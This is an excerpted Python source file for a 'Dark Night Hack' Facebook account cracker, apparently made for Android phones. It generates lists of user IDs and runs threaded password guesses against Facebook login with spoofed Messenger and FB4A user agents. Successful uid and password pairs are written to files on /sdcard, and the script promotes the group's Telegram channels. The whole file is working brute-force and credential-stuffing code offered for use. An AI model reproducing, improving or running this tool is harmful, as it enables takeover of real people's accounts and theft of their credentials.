...
#JOIN OUR TELEGRAM CHANNEL : https://t.me/Dark_Night_Hack
from os import path
...
def dnhafghan():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as DNH:	
			clear()
			tl = str(len(user))
...
def dnhafghan1():
		...
		clear()
		print('\033[1;37m [1] \033[1;37mJOIN OUR GROUP')
		os.system('xdg-open https://t.me/Dark_Night_Hack002 ')
		print('\033[1;36m------------------------------------------------')
		mthd = input(' CHOOSE: ')
		clear()
		print('\033[1;32m [1] \033[1;31mJOIN TELEGRAM CHANNEL')
		...
		os.system('python DNH.py')
endnh1 = ['en_GB','en_US']
dnhfban1 = [ 'MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
dnhsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Zong','Jazz','Etisalat']
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [D.N HACK-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                dnh_ua = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gttt)} Build/{str(gtt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,height=1024,width=2048};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(awmsim)};FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/D.N HACK-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [D.N HACK-OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                        open('/sdcard/D.N HACK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [D.N HACK-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/D.N HACK-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
...
def rndm2(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [D.N HACK-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                print('\r\r\033[1;32m [DN.HACK-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DN.HACK-OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
